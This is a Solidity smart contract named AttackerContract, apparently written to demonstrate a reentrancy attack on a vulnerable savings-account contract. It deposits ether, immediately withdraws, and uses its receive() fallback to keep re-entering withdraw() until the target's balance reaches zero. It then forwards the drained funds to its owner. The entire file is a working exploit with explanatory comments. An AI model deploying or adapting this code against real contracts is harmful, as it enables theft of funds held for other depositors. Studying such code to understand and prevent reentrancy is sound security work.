// SPDX-License-Identifier: MIT
pragma solidity 0.8.9;

import "../node_modules/@openzeppelin/contracts/access/Ownable.sol";

interface ISavingsAccountV1 {
  function deposit() external payable;

  function withdraw() external;
}

contract AttackerContract is Ownable {
  ISavingsAccountV1 public immutable savingsAccountV1;

  constructor(address savingsAccountAddress) {
    savingsAccountV1 = ISavingsAccountV1(savingsAccountAddress);
  }

  function exploitSavingsAccount() external payable onlyOwner {
    savingsAccountV1.deposit{ value: msg.value }(); // will depoist eth
    savingsAccountV1.withdraw(); // immedieate withdrawal
  }

  receive() external payable {
    if (address(savingsAccountV1).balance > 0) { // will keep checking the saving contract to see if there are still funds
      savingsAccountV1.withdraw(); // if so continune withdrawal
    } else {
      payable(owner()).transfer(address(this).balance); // when 0 send balance to this contract owner
    }
  }
}
